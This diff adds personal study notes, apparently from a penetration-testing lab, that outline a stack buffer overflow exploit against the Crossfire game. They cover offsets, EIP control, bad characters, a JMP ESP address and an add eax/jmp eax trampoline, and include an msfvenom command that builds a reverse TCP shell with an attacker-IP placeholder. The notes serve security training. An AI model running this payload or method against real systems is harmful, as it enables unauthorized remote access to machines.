@@ -1,0 +1,62 @@
+========
+debugger
+========
+edb : similar with Immunity debugger
+
+======
+target
+======
+A : offset
+B : shellcode address
+C : shellcode
+D : add eax,12 jmp eax code
+- : 0x90
+0 : 0x00
+
+eax (sta
+    rt s
+    ound
+    CCCC
+    CCCC
+    AAAA
+eip BBBB
+    DDDD
+    D--0
+
+eax : the eax driven buffer
+	add eax,12
+	jmp eax
+
+============================
+memory protection techniques
+============================
+DEP : data execution prevention
+ASLR : address space layout randomization
+Stack Canaries
+
+=======
+exploit
+=======
+1. replicating the crash
+	find offset by sending pattern
+2. controlling EIP
+	4 bytes after the offset
+3. locating space for our shellcode
+	it's started at eax
+4. checking for bad characters
+	bad character makes ESP dump part suddenly stopped with filled with null byte
+		crossfire : \x00\x20
+5. finding a return address
+	find "JMP ESP"
+	opcode search : find program memory loaded
+		find esp --> eip at jump equivalent
+		--> jmp esp address(0x08134596)
+6. generating shellcode with metasploit
+	msfvenom -p linux/x86/shell_reverse_tcp LHOS=<attacker ip> LPORT=<listening port> -f <format> -e x86/shikata_ga_nai -b "\x00\x20"
+7. redirecting to the shellcode
+	msf-nasm_shell
+		83C00C add eax,<buffer required string size>
+		FFE0   jmp eax
+		--> \x83\xc0\x0c\xff\xe0\x90\x90
+8. getting a shell
+	add shellcode at the start of buffer
